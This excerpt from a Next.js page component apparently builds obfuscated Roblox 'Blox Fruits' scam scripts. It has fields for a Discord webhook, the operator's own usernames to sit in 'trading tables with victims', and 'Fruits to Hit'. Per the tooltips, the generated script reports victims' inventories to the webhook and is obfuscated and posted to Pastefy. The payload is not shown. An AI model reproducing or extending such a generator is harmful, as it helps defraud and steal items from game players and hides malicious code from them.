...
// import ParticleComponent from '@/components/ParticleComponent'; // Remove static import

// --- Import next/dynamic ---
import dynamic from 'next/dynamic';

// --- Dynamically import ParticleComponent with SSR disabled ---
const ParticleComponent = dynamic(() => import('@/components/ParticleComponent'), {
...
export default function Home() {
  ...
  const toggleTooltip = (field: keyof typeof tooltipStates) => {
      if (isMobile) { setTooltipStates(prevState => ({ ...Object.fromEntries(Object.keys(prevState).map(key => [key, false])), [field]: !prevState[field], })); }
  };
  ...
  const generateScript = async () => {
    ...
    let formattedFruits = '';
    try {
      formattedUsernames = usernames.split('\n').map(user => user.trim()).filter(user => user.length > 0).map(user => `"${user}"`).join(', ');
      formattedFruits = selectedFruits.map(fruit => `"${fruit}"`).join(', ');
      ...
      startTransition(async () => {
        try {
          const result = await obfuscateScript(serverActionInput);
          setObfuscatedScript(result.obfuscatedScript);
          setPastefyLink(result.pastefyLink);
          toast({ title: 'Script Generated!', description: 'Webhook processed and script obfuscated successfully.' });
        } catch (error: any) {
          console.error("Error during script generation:", error);
          toast({ title: 'Error', description: `Failed to generate script: ${error.message}`, variant: 'destructive' });
          setObfuscatedScript(''); setPastefyLink(''); setConfiguredScript('');
        }
      });
    } catch (error: any) {
       console.error("Error formatting inputs:", error);
       toast({ title: 'Error', description: `Failed to process inputs: ${error.message}`, variant: 'destructive' });
    }
  };
  ...
  return (
    <>
      {/* ParticleComponent is now rendered only on the client */}
      <ParticleComponent />
        ...
        <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10 text-gray-100">
          ...
          <div className="mb-4">
             <div className="flex items-center space-x-2 mb-2">
                ...
                <TooltipProvider>
                  <Tooltip open={tooltipStates.webhookUrl} onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}>
                    <TooltipTrigger asChild>
                      <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('webhookUrl'); } }}><HelpCircle className="h-4 w-4 text-gray-400" /></Button>
                    </TooltipTrigger>
              ...
              <Input
                type="text" id="webhookUrl" value={webhookUrl}
                onChange={e => { setWebhookUrl(e.target.value); if (webhookError) setWebhookError(null); }}
                placeholder="Enter standard Discord or Protected Sharky URL"
              ...
              />
              {webhookError && (<p className="mt-1 text-sm text-red-400">{webhookError}</p>)}
          </div>
          ...
          <div className="mb-4">
               <div className="flex items-center space-x-2 mb-2">
                <Label htmlFor="usernames" className="text-cyan-400 font-bold">Usernames (one per line)</Label>
                  <TooltipProvider>
                     <Tooltip open={tooltipStates.usernames} onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, usernames: open })}>
                      <TooltipTrigger asChild><Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('usernames'); } }}><HelpCircle className="h-4 w-4 text-gray-400" /></Button></TooltipTrigger>
                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                          <ul><li>Enter usernames of <b>YOUR</b> accounts.</li><li>These will be the accounts that can use the script's commands.</li><li>They will also be the ones sitting in trading tables with victims.</li><li>Put one Roblox username per line, with <b>no spaces</b>.</li></ul>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
              </div>
              <Textarea id="usernames" value={usernames} onChange={e => setUsernames(e.target.value)} placeholder="Enter usernames, one per line" className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent" style={{fontFamily: 'Roboto Mono, monospace'}}/>
          </div>
          ...
          <div className="mb-4">
               <div className="flex items-center space-x-2 mb-2">
                <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                 <TooltipProvider>
                    <Tooltip open={tooltipStates.fruitsToHit} onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}>
                      <TooltipTrigger asChild><Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}><HelpCircle className="h-4 w-4 text-gray-400" /></Button></TooltipTrigger>
                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                          <ul><li>Select the fruits you want the script to detect.</li><li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li></ul>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
              </div>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
                 {sortedFruitsByRarity.map(fruit => (
                  <div key={fruit} className="flex items-center space-x-2">
                   <Checkbox id={fruit} checked={selectedFruits.includes(fruit)} onCheckedChange={() => handleFruitSelect(fruit)} className="border-cyan-500/50 data-[state=checked]:bg-cyan-500 data-[state=checked]:text-gray-900"/>
                    <label htmlFor={fruit} className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100">{fruit}</label>
                  </div>
                ))}
              </div>
          </div>
          ...
          {configuredScript && (
            <div className="mb-4">
              <div className="flex justify-between items-center mb-2">
                 ...
                 <Button onClick={() => copyToClipboard(configuredScript, 'Example structure copied.')} variant="outline" size="sm" className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1"><Copy className="h-3 w-3 mr-1" /> Copy</Button>
              </div>
              <Textarea value={configuredScript} readOnly className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90" rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}/>
            </div>
          )}
          ...
          {obfuscatedScript && (
            <div className="mb-4">
               <div className="flex justify-between items-center mb-2">
                 ...
                 <Button onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')} variant="outline" size="sm" className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1"><Copy className="h-3 w-3 mr-1" /> Copy</Button>
              </div>
              {pastefyLink && (
                <div className="mb-2 text-sm">
                  <span className="text-gray-400">Pastefy Link: </span>
                  <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">{pastefyLink}</a>
                </div>
              )}
              <Textarea value={obfuscatedScript} readOnly className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90" rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}/>
            </div>
          )}

          {/* Download Button */}
           <Button onClick={downloadScript} className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed" disabled={!obfuscatedScript || isGenerating} variant="outline">
